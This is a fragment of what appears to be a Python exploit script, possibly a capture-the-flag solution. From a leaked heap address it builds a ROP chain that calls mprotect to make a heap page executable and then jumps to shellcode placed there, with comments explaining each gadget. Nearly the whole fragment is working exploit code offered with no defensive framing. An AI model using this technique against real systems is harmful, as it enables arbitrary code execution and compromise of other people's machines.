...
def exploit(r1, r2, p):
	...
	if leak:
		...
		shellcode_addr = (leak << 12) + 0x1000  # Page-aligned heap

		# ROP chain for mprotect(shellcode_addr, 0x1000, 7)
		rop_chain = b""
		rop_chain += p64(pop_rdi)           # pop rdi; ret
		rop_chain += p64(shellcode_addr)    # addr argument
		rop_chain += p64(pop_rsi)           # pop rsi; ret  
		rop_chain += p64(0x1000)            # len argument (4KB page)
		rop_chain += p64(pop_rdx)           # pop rdx; ret
		rop_chain += p64(7)                 # PROT_READ|PROT_WRITE|PROT_EXEC
		rop_chain += p64(mprotect_addr)     # call mprotect()

		# After mprotect returns, jump to our shellcode
		rop_chain += p64(shellcode_addr)    # Jump to shellcode

		payload = p64(0) + rop_chain
